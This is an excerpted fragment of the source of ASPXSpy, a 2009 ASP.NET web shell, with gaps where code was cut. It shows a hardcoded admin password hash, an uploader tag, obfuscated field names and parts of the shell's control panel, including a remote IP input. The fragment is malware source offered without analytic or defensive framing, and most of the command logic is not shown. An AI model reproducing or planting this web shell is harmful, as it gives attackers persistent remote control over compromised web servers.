...
/*
*/
public string Password="8ef5afe9738f40b5aacd00b17074c1fc";//admin
public string vbhLn="Uploaded by Hieuhjt";
public int TdgGU=1;
...
Copyright &copy; 2009 Bin -- <a href="http://www.google.com" target="_blank">www.google.com</a>
</div>
<div id="ZVS" runat="server">
<div id="Zzj" runat="server">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;"><a href="http://www.google.com" target="_blank">ASPXSpy Ver: 2009</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="llH" type="text" size="20" value="www.google.com"/></td>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright &copy; 2006-2009 <a href="http://www.google.com" target="_blank">Bin'Blog</a> All Rights Reserved.</div></div>
</form>
</body>
</html>
